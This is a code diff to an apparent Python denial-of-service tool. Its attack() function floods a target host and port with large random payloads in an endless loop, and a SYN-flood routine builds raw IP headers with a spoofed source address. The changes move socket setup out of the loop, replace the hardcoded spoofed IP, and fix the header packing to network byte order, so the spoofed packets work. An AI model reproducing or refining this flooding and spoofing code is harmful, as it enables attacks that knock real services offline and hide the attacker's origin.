@@ -42,6 +42,10 @@ signal.signal(signal.SIGINT, sig_handler)
 
 def attack():
 
+    soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
+    soc.connect((host, port))
+
     global sent
     sent = 0
     byt = random._urandom(51200)
@@ -50,9 +54,6 @@ def attack():
 
     while True:
         try:
-            soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
-            soc.connect((host, port))
             soc.send(byt)
 
             #soc.sendto(("GET /" + host + " HTTP/1.1\r\n").encode('ascii'),(host, port))
@@ -102,7 +103,7 @@ def HeaderSyn():
 
     global source_ip
     global dest_ip
-    source_ip = '192.36.78.1'
+    source_ip = '186.89.217.114'
     dest_ip = host
 
     ihl = 5
@@ -118,7 +119,7 @@ def HeaderSyn():
     daddr = host
     ihl_version = (version << 4) + ihl
     global ip_header
-    ip_header =  pack('BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
+    ip_header =  pack('!BBHHHBBH4s4s', ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
 
 def Tcp():
     HeaderSyn()
@@ -182,5 +183,6 @@ if ina == 1:
 elif ina == 2:
     executesyn()
     
+
 
 
